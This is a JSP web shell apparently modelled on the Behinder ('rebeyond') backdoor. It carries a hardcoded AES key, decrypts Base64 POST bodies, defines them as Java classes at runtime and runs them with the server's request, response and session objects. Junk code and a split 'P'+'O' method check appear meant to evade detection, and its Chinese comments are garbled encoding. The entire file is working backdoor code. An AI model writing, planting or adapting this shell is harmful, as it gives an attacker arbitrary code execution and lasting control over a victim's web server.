<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%@ page import="java.io.UnsupportedEncodingException" %>

<%!
    public  class Controller extends ClassLoader {



        public Class getClass(byte[] b) throws UnsupportedEncodingException {

            String encoding = "UTF-8";
            String s = new String(b,encoding);
            byte[] res = new byte[b.length];
            System.out.println(b.length);
            for (int i = 0; i < b.length/2; i++) {
//                System.out.print("orgin: " + b[i]);
                res[i] = (byte) (b[i] + 1);
            }
            for (int i = 0; i < b.length/2; i++) {
//                System.out.print("orgin: " + b[i]);
                b[i] = (byte) (res[i] - 1);
            }

            byte[] bytes = s.getBytes(encoding);
            String s1 = new String(bytes,encoding);
            System.out.println(s);
            System.out.println(s1);
            System.out.println(s.equals(s1));
            if (!b.toString().equals(bytes.toString())){
                System.out.println("do nothing");
            }
            // ���ø����defineClass���� , �൱���Զ��������
            //�����뽫����һ�� java.lang.Class �������������ʾͨ���ֽ����� b �е����ļ����ݶ�̬���ص��ࡣ
            // defineClass �������ڽ�����������ת��Ϊ���ʵ����
            Class<?> aClass = super.defineClass(b, 0, b.length);
            return aClass;
        }

        //���캯��
        public Controller(ClassLoader c) {
            super(c);
            //������
            int a = 1;
            int b = a << 2;
            System.out.println(a+b);
        }
    }
%><%


    if (request.getMethod().startsWith("P"+"O")) {
        String text = "e45e329feb5d925b";/*����ԿΪ��������32λmd5ֵ��ǰ16λ��Ĭ����������rebeyond*/
        HashMap<String, Object> hashMap = new HashMap<>();
        session.putValue("u", text);
        hashMap.put("request",request);
        hashMap.put("response",response);
        hashMap.put("session",session);

        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(text.getBytes(), "AES"));
        new Controller(this.getClass().getClassLoader())
                //���÷���g ����һ����
                .getClass(
                        c.doFinal(
                                //sun.misc.BASE64Decoder �౻���ڽ��� HTTP POST �����е����ݣ�
                                // �����ݾ��� BASE64 ���롣�������ͨ���ڷ����������ڴ���ͻ��˴��ݵ����ݣ�
                                // ����������Ҫ�������ݽ��ܻ�ԭʱ��
                                new sun.misc.BASE64Decoder()
                                        .decodeBuffer(request.getReader().readLine())))
                //������g ����һ���࣬����newInstance() �� ,�൱��new
                .newInstance().equals(hashMap);
    }
%>